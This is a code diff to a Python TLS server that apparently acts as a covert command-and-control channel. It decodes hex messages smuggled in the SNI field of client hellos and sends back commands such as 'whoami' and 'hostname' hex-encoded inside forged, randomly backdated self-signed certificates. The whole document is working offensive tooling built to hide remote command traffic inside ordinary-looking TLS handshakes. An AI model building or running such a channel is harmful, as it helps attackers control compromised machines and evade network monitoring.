@@ -24,10 +24,16 @@ from cryptography.hazmat.backends import default_backend
 from cryptography.hazmat.primitives import serialization
 from cryptography.hazmat.primitives.asymmetric import rsa
 
-from tlslite.messages import Message, ClientHello
-from tlslite.tlsrecordlayer import TLSRecordLayer
+from tlslite.messages import ServerHello
+from tlslite.messages import HandshakeMsg
+
+from tlslite.messages import Certificate
+from tlslite.constants import CipherSuite
+from tlslite.constants import CertificateType
+from tlslite.x509certchain import X509CertChain
 
 import socketserver
+import struct
 
 import ipaddress
 from datetime import datetime, timedelta
@@ -50,6 +56,7 @@ def get_cert_from_pem(pem: bytes) -> x509.Certificate:
 
 class TLSServerHandshake:
     key = None
+    current_cert = None
     default_cert = None
 
     def __init__(self):
@@ -59,14 +66,15 @@ class TLSServerHandshake:
                 key_size=2048,
                 backend=default_backend(),
             )
-        self.default_cert = self.create_message
+        self.current_cert = self.create_default_cert("localhost")
+        self.default_cert = self.current_cert
 
     def create_message(self, message: bytes) -> x509.Certificate:
         # Based on: https://gist.github.com/bloodearnest/9017111a313777b9cce5
         host, domain, tld = self._get_random_hostname()
-        fqdn = host + "." + domain + "." + tld
+        fqdn = domain + "." + tld
         name = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, fqdn)])
-        hex_msg = self._str_to_hex(str(message)) + "." + host + "." + tld
+        hex_msg = self._str_to_hex(message.decode()) + "." + fqdn
         if len(hex_msg) > MAX_SINGLE_MSG_LEN:
             print(
                 f"ERROR: Encoded message length of {len(hex_msg)} (original length was {len(message)}) exceeds MAX_LEN of {MAX_SINGLE_MSG_LEN}"
@@ -76,41 +84,67 @@ class TLSServerHandshake:
         san = x509.SubjectAlternativeName([x509.DNSName(hex_msg)])
         # Now ready to create the crafter Certificate...
         basic_contraints = x509.BasicConstraints(ca=True, path_length=0)
-        now = datetime.utcnow()
+        create_ts = datetime.utcnow() - timedelta(seconds=random.randint(86400, 2592000))
         cert = (
             x509.CertificateBuilder()
             .subject_name(name)
             .issuer_name(name)
             .public_key(self.key.public_key())
             .serial_number(1000)
-            .not_valid_before(now)
-            .not_valid_after(now + timedelta(days=10 * 365))
+            .not_valid_before(create_ts)
+            .not_valid_after(create_ts + timedelta(days=random.randint(1, 30)))
             .add_extension(basic_contraints, False)
             .add_extension(san, False)
             .sign(self.key, hashes.SHA256(), default_backend())
         )
         # cert_pem = cert.public_bytes(encoding=serialization.Encoding.PEM)
+        self.current_cert = cert
         return cert
 
-    def create_default_cert(self, common_name: str) -> x509.Certificate:
-        cn = ""
-        if not common_name:
+    def _get_random_seed(self) -> bytes:
+        return bytes([random.randrange(0, 256) for _ in range(0, 32)])
+
+    def create_handshake(self, message: bytes) -> typing.Tuple[bytes, bytes]:
+        """Creates TLS Server Handshake Messages and returns the following Tuple(server_hello , certificate)"""
+        server_hello = ServerHello().create(
+            version=(3, 3),
+            random=self._get_random_seed(),
+            session_id=bytearray(0),
+            cipher_suite=CipherSuite.TLS_RSA_WITH_AES_128_CBC_SHA256,
+            certificate_type=CertificateType.x509,
+            tackExt=None,
+            next_protos_advertised=None,
+        )
+        certificate_handshake = Certificate(CertificateType.x509)
+        tlsng_x509 = X509CertChain()
+        # print(self.current_cert.public_bytes(encoding=serialization.Encoding.PEM))
+        cert_pem = None
+        if not message:
+            cert_pem = self.default_cert.public_bytes(encoding=serialization.Encoding.PEM).decode()
+        else:
+            cert_pem = self.create_message(message).public_bytes(encoding=serialization.Encoding.PEM).decode()
+        tlsng_x509.parsePemList(cert_pem)
+        certificate_handshake.certChain = tlsng_x509
+        return (server_hello.write(), certificate_handshake.write())
+
+    def create_default_cert(self, cn: str) -> x509.Certificate:
+        if not cn:
             cn = ".".join(self._get_random_hostname())
-        now_ts = datetime.utcnow()
-        return (
+        create_ts = datetime.utcnow() - timedelta(seconds=random.randint(86400, 2592000))
+        cert = (
             x509.CertificateBuilder()
             .subject_name(x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, cn)]))
             .issuer_name(x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, cn)]))
             .public_key(self.key.public_key())
             .serial_number(1000)
-            .not_valid_before(now_ts)
-            .not_valid_after(now_ts + timedelta(days=10 * 365))
+            .not_valid_before(create_ts)
+            .not_valid_after(create_ts + timedelta(days=random.randint(1, 30)))
             .add_extension(x509.BasicConstraints(ca=True, path_length=0), False)
-            .add_extension(
-                x509.SubjectAlternativeName([x509.DNSName(x509.SubjectAlternativeName([x509.DNSName(cn)]))]), False
-            )
+            .add_extension(x509.SubjectAlternativeName([x509.DNSName(cn)]), False)
             .sign(self.key, hashes.SHA256(), default_backend())
         )
+        self.default_cert = cert
+        return cert
 
     def _get_random_hostname(self) -> typing.Tuple[str, str, str]:
         tld = "".join(random.choice(string.ascii_lowercase) for i in range(random.randint(2, 4)))
@@ -134,6 +168,13 @@ TEST = None
 
 
 class ThreadedTCPSocketServer(socketserver.StreamRequestHandler):
+
+    tls_server_handshake = None
+
+    def setup(self):
+        self.tls_server_handshake = TLSServerHandshake()
+        return super().setup()
+
     def handle(self):
         # Receive and print the data received from client
         print("Recieved one request from {}".format(self.client_address[0]))
@@ -141,21 +182,43 @@ class ThreadedTCPSocketServer(socketserver.StreamRequestHandler):
         #
         # Expect TLS Record; Reader header to confirm
         msg = self.rfile.read(9)
-        print(f"Bytes Recieved from client: {len(msg)}")
+        # print(f"Bytes Recieved from client: {len(msg)}")
         msg_hex_str = msg.hex()
         # print(msg_hex_str)
         if not self.validate_client_hello(msg_hex_str):
             return
         msg = self.rfile.read(int(msg_hex_str[12:], 16))
-        print(msg.hex())
+        # print(msg.hex())
+        # TODO: we need to handle more than just type(str) here...
         sni = self._get_sni(msg.hex())
-        sni_str = bytes.fromhex(sni.split(".")[0]).decode()
-        print(f"___ {sni_str} ___")
+        print(f" < {sni}")
+        # sni_str = bytes.fromhex(sni.split(".")[0]).decode()
+        # print(f"___ {sni_str} ___")
         # with open("bin.out", "wb") as fh:
         #     fh.write(msg)
         # print(msg)
-        self.decode_msg(msg)
-        print("Thread Name:{}".format(threading.current_thread().name))
+        cmd, payload = self.decode_msg(sni)
+        # TODO: for demo purposes
+        has_cmd = False
+        response_msg_bytes = b""
+        if cmd == "DEMO_CMD_1":
+            has_cmd = True
+            response_msg_bytes = self.create_message(b"whoami")
+        if cmd == "DEMO_CMD_2":
+            has_cmd = True
+            response_msg_bytes = self.create_message(b"hostname")
+        if cmd == "ping":
+            has_cmd = True
+            response_msg_bytes = self.create_message(b"PONG!")
+        if not has_cmd:
+            # For now, just echo back what was sent in the SNA msg
+            response_msg_bytes = self.create_message(sni.encode())
+        self.wfile.write(response_msg_bytes)
+
+    def create_message(self, msg: bytes) -> bytes:
+        server_hello, certificate = self.tls_server_handshake.create_handshake(msg)
+        header = bytes.fromhex("160303") + struct.pack(">H", (len(server_hello) + len(certificate)))
+        return header + server_hello + certificate
 
     def _get_sni(self, hex_str: str) -> str:
         # 2 + 32 + session_id_len[1 byte] + suites_len[2 bytes]
@@ -214,13 +277,12 @@ class ThreadedTCPSocketServer(socketserver.StreamRequestHandler):
             return False
         return True
 
-    def decode_msg(self, msg: bytes):
-        try:
-            c = ClientHello(msg)
-        except:
-            print("[!] Could not parse message!")
-        print(str(c.server_name))
-        print(str(c))
+    def decode_msg(self, msg: str) -> typing.Tuple[str, str]:
+        """Extracts the smuggled SNI message from the Client Hello"""
+        # TODO: For the momement, only handles string types, not arbitrary byte payloads - Fix this up
+        payload = msg.split(".")[0]
+        cmd = payload.split(" ")[0]
+        return (cmd, payload)
 
     def tls_server_hello(self, cert: x509.Certificate):
         return
@@ -260,6 +322,8 @@ if __name__ == "__main__":
     TCPServerInstance = socketserver.ThreadingTCPServer(("0.0.0.0", int(port)), ThreadedTCPSocketServer)
     print(f"[+] Listening on 0.0.0.0:{port}")
     try:
+        # TODO: Can't Reuse port while bind port is in TIME-WAIT state !!
+        TCPServerInstance.allow_reuse_address = True
         TCPServerInstance.serve_forever()
     except KeyboardInterrupt:
         TCPServerInstance.shutdown()
